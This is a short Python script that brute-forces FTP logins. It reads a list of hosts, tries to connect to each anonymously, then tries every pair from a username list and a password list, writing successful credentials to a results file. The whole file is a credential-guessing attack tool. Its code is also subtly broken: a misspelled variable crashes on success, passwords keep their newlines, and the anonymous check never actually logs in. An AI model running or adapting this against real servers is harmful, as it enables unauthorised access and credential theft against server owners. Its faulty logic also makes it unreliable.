from ftplib import FTP



f= open("results.txt","a+")

with open("ftp_hosts1.txt") as file:
	for line in file:
		line = line.strip() 
		try:
			print("Try to connect to: {}, anonymously".format(line))
			ftp = FTP(line, timeout=3)

		except:
			print("connection to {} failed!".format(line))
		else:
			print("connection to {} successed!".format(line))
			f.write("connection to {} anonymously successed!".format(line))

		print("Try to connect to: {}, with username and password".format(line))
	
		
		with open("A-List-Users-Short.txt") as file:
			for user in file:
				user = user.strip() 
				#print user
				with open("A-List-passwords.txt") as file2:
					for password in file2:
						#print ("user:{}, password:{}".format(user, password))
							try:
								ftp = FTP(line,user,password, timeout=3)

							except:
								print("connection to {} with user: {} and password: {} failed!".format(line, user, password))
							else:
								print("connection to {} with user: {} and password: {} successed!".format(line, user, passsword))
								f.write("connection to {} with user: {} and password: {} successed!".format(line, user, passsword))
								
f.close()
